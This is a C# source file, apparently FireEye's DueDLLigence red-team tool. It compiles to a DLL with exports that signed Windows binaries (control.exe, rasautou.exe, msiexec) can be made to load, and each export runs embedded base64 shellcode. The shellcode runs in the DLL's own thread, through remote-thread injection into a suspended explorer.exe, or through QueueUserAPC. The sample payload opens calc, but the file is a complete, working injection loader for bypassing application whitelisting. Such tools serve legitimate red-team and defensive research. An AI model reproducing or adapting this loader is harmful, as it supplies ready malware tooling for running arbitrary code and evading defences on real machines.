using System;
using RGiesecke.DllExport;
using System.Runtime.InteropServices;
using System.Diagnostics;

/* Copyright (C) 2019 FireEye, Inc. All Rights Reserved.
 * 
 * Last Updated: 2019-03-22
 * Author: Evan Pena
 * Contributors: Casey Erikson
 * Original research/Inspired by: Casey Smith. 
 * Optional: CallingConvention.StdCall. I like using Cdecl because it's not used as often.
 * See README for usage
 * Shellcode in this example will pop calc.
 */

namespace DueDLLigence
{
    public class DueDLLigence
    {
        //Change to preferred execution/injection method
        public const ExecutionMethod method = ExecutionMethod.CreateThread;

        public enum ExecutionMethod
        {
            CreateThread,
            CreateRemoteThread,
            QueueUserAPC
        }

        //Entry point for control.exe. Rename compiled DLL to .cpl file extension
        [DllExport("CPlApplet", CallingConvention = CallingConvention.Cdecl)]
        public static bool CPlApplet()
        {
            RunShellcode();
            return false;
        }

        //Entry point for Rasautou.exe
        [DllExport("powershell", CallingConvention = CallingConvention.Cdecl)]
        public static bool Powershell()
        {
            RunShellcode();
            return false;
        }

        //Entry point for MSIExec
        [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.Cdecl)]
        public static bool DllUnRegisterServer()
        {
            RunShellcode();
            return false;
        }


        private static void RunShellcode()
        {
            //Base64 encoded shellcode
            string base64Shellcode = "/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

            //Process to inject into
            string process = "C:\\windows\\explorer.exe";

            //Convert Base64 encoded shellcode to raw bytes
            byte[] shellcode = Convert.FromBase64String(base64Shellcode);

            //Execute or inject shellcode
            switch (method)
            {
                case ExecutionMethod.CreateThread:
                    ExecCreateThread(shellcode);
                    break;
                case ExecutionMethod.CreateRemoteThread:
                    ExecCreateRemoteThread(shellcode, process);
                    break;
                case ExecutionMethod.QueueUserAPC:
                    ExecQueueUserAPC(shellcode, process);
                    break;
            }
        }

        private static void ExecCreateThread(byte[] shellcode)
        {
            //Initializations
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            //Allocate executable memory in current process
            IntPtr address = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            if (address == IntPtr.Zero)
                return;

            //Copy shellcode into allocated memory
            Marshal.Copy(shellcode, 0, address, shellcode.Length);

            //Modify memory protections to allow execution
            if (!VirtualProtect(address, (uint)shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory and exit
                VirtualFree(address, 0, FreeType.Release);
                return;
            }

            //Create thread in current process to execute shellcode
            hThread = CreateThread((IntPtr)0, 0, address, IntPtr.Zero, 0, ref threadId);

            if (hThread == IntPtr.Zero)
            {
                //Clean up memory allocation and exit
                VirtualFree(address, 0, FreeType.Release);
                return;
            }

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        private static void ExecCreateRemoteThread(byte[] shellcode, string process)
        {
            //Initialization
            IntPtr bytesWritten = IntPtr.Zero;

            //Start process to inject into
            PROCESS_INFORMATION processInfo = StartProcess(process);
            if (processInfo.hProcess == IntPtr.Zero)
                return;

            Process targetProcess = Process.GetProcessById((int)processInfo.dwProcessId);

            //Open the process to inject into
            IntPtr processHandle = OpenProcess(PROCESS_ALL, false, targetProcess.Id);
            if (processHandle == IntPtr.Zero)
                return;

            //Allocate executable memory
            IntPtr address = VirtualAllocEx(processHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            if (address == IntPtr.Zero)
            {
                targetProcess.Close();
                return;
            }

            //Write shellcode into allocated memory in target process
            if (!WriteProcessMemory(processHandle, address, shellcode, shellcode.Length, out bytesWritten))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Modify memory protections to allow execution
            if (!VirtualProtectEx(processInfo.hProcess, address, shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Create thread in remote process to execute shellcode
            if (CreateRemoteThread(processHandle, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero) == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }
        }

        private static void ExecQueueUserAPC(byte[] shellcode, string process)
        {
            //Initialization
            IntPtr bytesWritten = IntPtr.Zero;

            //Start process to inject into
            PROCESS_INFORMATION processInfo = StartProcess(process);
            if (processInfo.hProcess == IntPtr.Zero)
                return;

            Process targetProcess = Process.GetProcessById((int)processInfo.dwProcessId);

            //Allocate executable memory 
            IntPtr address = VirtualAllocEx(processInfo.hProcess, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_READWRITE);

            if (address == IntPtr.Zero)
            {
                targetProcess.Close();
                return;
            }

            //Write shellcode into allocated memory in target process
            if (!WriteProcessMemory(processInfo.hProcess, address, shellcode, shellcode.Length, out bytesWritten))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Modify memory protections to allow execution
            if (!VirtualProtectEx(processInfo.hProcess, address, shellcode.Length, PAGE_EXECUTE_READ, out uint oldProtect))
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Open a thread in target process
            ProcessThreadCollection currentThreads = targetProcess.Threads;

            IntPtr thread = OpenThread(ThreadAccess.SET_CONTEXT, false, currentThreads[0].Id);
            if (thread == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Queue thread for asynchronous procedure call
            IntPtr ptr = QueueUserAPC(address, thread, IntPtr.Zero);
            if (ptr == IntPtr.Zero)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }

            //Resume thread to execute shellcode
            if (ResumeThread(processInfo.hThread) == 0)
            {
                //Clean up memory allocation, stop process, and exit
                Clean(processInfo.hProcess, address, shellcode.Length, targetProcess);
                return;
            }
        }

        private static void Clean(IntPtr hProcess, IntPtr address, int length, Process target)
        {
            VirtualFreeEx(hProcess, address, length, FreeType.Release);
            target.Close();
        }

        private static PROCESS_INFORMATION StartProcess(string process)
        {
            STARTUPINFO startupInfo = new STARTUPINFO();
            PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
            bool success = CreateProcess(process, null,
                IntPtr.Zero, IntPtr.Zero, false,
                ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW,
                IntPtr.Zero, null, ref startupInfo, out processInfo);

            return processInfo;
        }

        private static readonly UInt32 MEM_COMMIT = 0x1000;
        private static readonly UInt32 PAGE_EXECUTE_READ = 0x20;
        private static readonly UInt32 PAGE_READWRITE = 0x04;

        private static readonly int PROCESS_ALL = 0x1F0FFF;

        [Flags]
        public enum FreeType
        {
            Decommit = 0x4000,
            Release = 0x8000,
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_SUSPENDED = 0x00000004
        }

        [Flags]
        public enum ThreadAccess : int
        {
            SET_CONTEXT = (0x0010)
        }

        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(
          IntPtr lpThreadAttributes,
          uint dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            int dwDesiredAccess,
            bool bInheritHandle,
            int dwProcessId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(
            ThreadAccess dwDesiredAccess,
            bool bInheritHandle,
            int dwThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr QueueUserAPC(
            IntPtr pfnAPC,
            IntPtr hThread,
            IntPtr dwData
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint ResumeThread(
            IntPtr hThread
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(
          UInt32 lpStartAddr,
          UInt32 size,
          UInt32 flAllocationType,
          UInt32 flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            Int32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualFree(
            IntPtr lpAddress,
            UInt32 dwSize,
            FreeType dwFreeType
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFreeEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            FreeType dwFreeType
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(
           IntPtr lpAddress,
           uint dwSize,
           uint flNewProtect,
           out uint lpflOldProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern UInt32 WaitForSingleObject(
         IntPtr hHandle,
         uint dwMilliseconds
       );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten
        );
    }
}
